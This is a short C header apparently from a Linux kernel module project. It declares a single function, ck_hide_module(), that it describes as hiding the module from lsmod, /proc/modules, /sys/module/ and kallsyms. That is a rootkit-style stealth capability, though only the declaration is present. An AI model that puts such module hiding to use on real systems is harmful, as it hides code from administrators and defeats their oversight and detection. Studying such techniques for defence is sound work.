/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _COKERNEL_STEALTH_H
#define _COKERNEL_STEALTH_H

/*
 * Hide the module from all kernel introspection mechanisms:
 *   - lsmod / /proc/modules
 *   - /sys/module/
 *   - kallsyms
 */
void ck_hide_module(void);

#endif /* _COKERNEL_STEALTH_H */
